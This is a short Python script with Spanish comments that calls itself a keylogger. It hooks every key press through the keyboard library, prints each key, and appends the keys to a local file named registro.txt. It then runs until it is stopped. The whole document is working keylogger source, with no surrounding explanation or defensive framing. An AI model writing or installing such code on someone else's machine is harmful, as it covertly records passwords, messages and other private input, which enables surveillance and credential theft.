import keyboard  

# Lógica del keylogger


def registrar_pulsaciones(event):
    # definir variable
    tecla = str(event.name)
    # mostrar evento capturado
    print(tecla)

    if tecla == "space":
        tecla = " "

    # se abre el txt
    with open("registro.txt", 'a') as log_file:
        # escribimos información
        log_file.write(tecla)

keyboard.on_press(registrar_pulsaciones) 
keyboard.wait()
